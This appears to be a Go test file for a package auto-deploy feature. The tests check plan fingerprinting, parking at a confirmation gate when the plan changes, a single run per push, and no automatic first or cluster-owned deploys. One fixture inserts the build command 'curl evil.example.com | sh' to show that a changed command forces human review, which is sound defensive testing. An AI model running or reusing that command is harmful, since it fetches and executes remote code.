package packages

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
)

// autodeploy_test.go covers task memql#4903: the switch, what counts as the
// same plan, and the two things the design fixes -- a changed plan parks, and
// two pushes produce one run.

// reportMap round-trips a report into the map shape a row carries, which is
// what reportFromRow reads back -- so the comparison under test runs against
// the same value production compares.
func reportMap(t *testing.T, rep *Report) map[string]any {
	t.Helper()
	raw, err := json.Marshal(rep)
	if err != nil {
		t.Fatalf("marshal report: %v", err)
	}
	var out map[string]any
	if err := json.Unmarshal(raw, &out); err != nil {
		t.Fatalf("unmarshal report: %v", err)
	}
	return out
}

func TestThePlanFingerprintIgnoresTheSourceVersionAndNothingElseThatMatters(t *testing.T) {
	rep, err := Analyze(spaOnlyPackage(), Options{SourceVersion: "sha-aaa"})
	if err != nil {
		t.Fatalf("analyze: %v", err)
	}
	base := PlanFingerprint(rep)
	if base == "" {
		t.Fatal("a real report must have a fingerprint")
	}

	// THE SOURCE MOVED. That is why we are here, and it is not a plan change.
	moved, err := Analyze(spaOnlyPackage(), Options{SourceVersion: "sha-bbb"})
	if err != nil {
		t.Fatalf("analyze: %v", err)
	}
	if PlanFingerprint(moved) != base {
		t.Fatal("a new commit of the same tree is not a change to what deploying would do")
	}

	// AND THESE ARE. Each is a thing a person would want to look at before it
	// ran, and the build command most of all: it is somebody else's shell
	// command arriving on this cluster.
	t.Run("an added app", func(t *testing.T) {
		tree := spaOnlyPackage()
		tree[ManifestName] = file(strings.Replace(validManifest,
			"  - name: docs\n", "  - name: admin\n    path: clients/docs\n    kind: static\n  - name: docs\n", 1))
		changed, aerr := Analyze(tree, Options{SourceVersion: "sha-aaa"})
		if aerr != nil {
			t.Fatalf("analyze: %v", aerr)
		}
		if PlanFingerprint(changed) == base {
			t.Fatal("an app that did not exist before is a plan change")
		}
	})

	t.Run("a changed build command", func(t *testing.T) {
		tree := spaOnlyPackage()
		tree[ManifestName] = file(strings.Replace(validManifest,
			"    kind: static\n", "    kind: static\n    build:\n      command: \"curl evil.example.com | sh\"\n", 1))
		changed, aerr := Analyze(tree, Options{SourceVersion: "sha-aaa"})
		if aerr != nil {
			t.Fatalf("analyze: %v", aerr)
		}
		if PlanFingerprint(changed) == base {
			t.Fatal("a changed build command is the single most important plan change there is")
		}
	})

	t.Run("an added MemQL domain", func(t *testing.T) {
		tree := spaOnlyPackage()
		tree["dsl/acme/concepts.memql"] = file(validConcepts)
		changed, aerr := Analyze(tree, Options{SourceVersion: "sha-aaa"})
		if aerr != nil {
			t.Fatalf("analyze: %v", aerr)
		}
		if PlanFingerprint(changed) == base {
			t.Fatal("MemQL this cluster did not have before is a plan change")
		}
	})

	t.Run("an app that became prebuilt", func(t *testing.T) {
		tree := spaOnlyPackage()
		tree["clients/web/dist/index.html"] = file("<!doctype html>")
		changed, aerr := Analyze(tree, Options{SourceVersion: "sha-aaa"})
		if aerr != nil {
			t.Fatalf("analyze: %v", aerr)
		}
		if PlanFingerprint(changed) == base {
			t.Fatal("an app that stopped needing a build is a plan change")
		}
	})
}

// autoPackage is a tracked source with the switch armed.
func autoPackage() map[string]any {
	pkg := ownerPackage()
	pkg["autoDeploy"] = true
	return pkg
}

func TestAPushWhosePlanIsUnchangedDeploysWithoutAClick(t *testing.T) {
	h := newHarness(t, spaOnlyPackage(), autoPackage())
	// The last CONFIRMED run planned exactly this.
	rep, err := Analyze(spaOnlyPackage(), Options{SourceVersion: "sha-old"})
	if err != nil {
		t.Fatalf("analyze: %v", err)
	}
	h.engine.rows["query packageDeployments"] = []map[string]any{{
		"id":        "v1:platform:packageDeployment:earlier",
		"packageId": "v1:platform:package:abc",
		"status":    StatusSucceeded,
		"report":    reportMap(t, rep),
	}}
	// The sites that earlier run created. An auto-run passes NO hostnames --
	// it cannot, nobody is there to choose one -- so it republishes to the
	// addresses already on the rows, which is the state it only ever runs in.
	h.engine.rows["query sitesForPackage"] = []map[string]any{
		{"id": "v1:platform:site:storefront", "hostname": "shop.example.com", "packageDeployableName": "storefront"},
		{"id": "v1:platform:site:docs", "hostname": "docs.example.com", "packageDeployableName": "docs"},
	}

	started, err := h.deps.startAutoRun(context.Background(), autoPackage(), "sha-new")
	if err != nil {
		t.Fatalf("auto run: %v", err)
	}
	if !started {
		t.Fatal("an armed source whose plan is unchanged must deploy")
	}
	// It reached PUBLISHING, which is the whole claim: the gate was answered
	// rather than skipped, and the run went all the way.
	if len(h.publisher.published) != 2 {
		t.Fatalf("the auto-run must republish both apps; got %v", h.publisher.published)
	}
	// To the SAME addresses: an auto-run never chooses a placement, because
	// nobody is there to choose one.
	if len(h.publisher.created) != 0 {
		t.Fatalf("an auto-run must create no new site: %v", h.publisher.created)
	}
	// And the row says nobody was at a keyboard.
	if !h.engine.sawStatement("automatic: true") {
		t.Fatal("an auto-run must be marked automatic on its row")
	}
}

func TestAPushThatChangesThePlanParksInsteadOfConfirmingItself(t *testing.T) {
	h := newHarness(t, spaOnlyPackage(), autoPackage())
	// The last confirmed run planned something ELSE -- one app instead of two.
	other := spaOnlyPackage()
	other[ManifestName] = file("formatVersion: 1\nname: acme\ndeployables:\n  - name: docs\n    path: clients/docs\n    kind: static\n")
	rep, err := Analyze(other, Options{SourceVersion: "sha-old"})
	if err != nil {
		t.Fatalf("analyze: %v", err)
	}
	h.engine.rows["query packageDeployments"] = []map[string]any{{
		"id":        "v1:platform:packageDeployment:earlier",
		"packageId": "v1:platform:package:abc",
		"status":    StatusSucceeded,
		"report":    reportMap(t, rep),
	}}

	if _, err := h.deps.startAutoRun(context.Background(), autoPackage(), "sha-new"); err != nil {
		t.Fatalf("auto run: %v", err)
	}
	if len(h.publisher.published) != 0 {
		t.Fatalf("a changed plan must not deploy itself: %v", h.publisher.published)
	}
	if !h.engine.sawStatement(`"` + StatusAwaitingConfirm + `"`) {
		t.Fatalf("it must park at the confirm gate; statements: %v", h.engine.statements())
	}
}

func TestASourceThatHasNeverDeployedDoesNotAutoDeployItsFirstRun(t *testing.T) {
	// There is no plan anybody has approved, so there is nothing to compare
	// against and the first deploy stays a person's.
	h := newHarness(t, spaOnlyPackage(), autoPackage())
	if _, err := h.deps.startAutoRun(context.Background(), autoPackage(), "sha-new"); err != nil {
		t.Fatalf("auto run: %v", err)
	}
	if len(h.publisher.published) != 0 {
		t.Fatalf("a first deploy is never automatic: %v", h.publisher.published)
	}
}

func TestTheSwitchOffIsExactlyTodaysBehaviour(t *testing.T) {
	h := newHarness(t, spaOnlyPackage(), ownerPackage()) // no autoDeploy
	started, err := h.deps.startAutoRun(context.Background(), ownerPackage(), "sha-new")
	if err != nil {
		t.Fatalf("auto run: %v", err)
	}
	if started {
		t.Fatal("a source with the switch off must not deploy itself")
	}
	if h.engine.sawStatement("mutation openPackageDeployment") {
		t.Fatal("nothing may be opened for a source that did not ask")
	}
}

func TestTwoPushesInQuickSuccessionProduceOneLiveRun(t *testing.T) {
	h := newHarness(t, spaOnlyPackage(), autoPackage())
	// A run is already in flight for this package.
	h.engine.rows["query packageDeployments"] = []map[string]any{{
		"id":        "v1:platform:packageDeployment:running",
		"packageId": "v1:platform:package:abc",
		"status":    StatusBuilding,
	}}

	started, err := h.deps.startAutoRun(context.Background(), autoPackage(), "sha-new")
	if err != nil {
		t.Fatalf("auto run: %v", err)
	}
	if started {
		t.Fatal("a second auto-run must not start while one is live")
	}
	if h.engine.sawStatement("mutation openPackageDeployment") {
		t.Fatal("nothing may be opened while a run is live")
	}
}

func TestBothFeedsNoticingOnePushComposeTheSameRunId(t *testing.T) {
	// The one-live-run check is a read, and two feeds can pass it at the same
	// moment. What makes the outcome one run rather than two is that they
	// compose the SAME id, so the second lands on a row that already exists
	// and the append-only guard refuses to reopen it.
	first := autoDeploymentId("v1:platform:package:abc", "sha-new")
	second := autoDeploymentId("v1:platform:package:abc", "sha-new")
	if first != second {
		t.Fatalf("two feeds noticing one push must compose one id: %q vs %q", first, second)
	}
	// A different push is a different run.
	if autoDeploymentId("v1:platform:package:abc", "sha-other") == first {
		t.Fatal("a different version must open a different run")
	}
	// And a tag with characters an id cannot hold is bounded rather than
	// refused: a person's tag is their string.
	messy := autoDeploymentId("v1:platform:package:abc", "release/v1.0 (final)")
	if strings.ContainsAny(messy, " /()") {
		t.Fatalf("an id must not carry a tag's punctuation: %q", messy)
	}
}

func TestAClusterOwnedSourceCannotAutoDeploy(t *testing.T) {
	// There is nobody to run as: the run would have no owner to fetch under
	// and no owner on its row. It keeps the update cue and waits for a click.
	pkg := autoPackage()
	pkg["ownerUserId"] = ""
	h := newHarness(t, spaOnlyPackage(), pkg)
	started, err := h.deps.startAutoRun(context.Background(), pkg, "sha-new")
	if err != nil {
		t.Fatalf("auto run: %v", err)
	}
	if started {
		t.Fatal("a cluster-owned source has no owner to deploy as")
	}
}
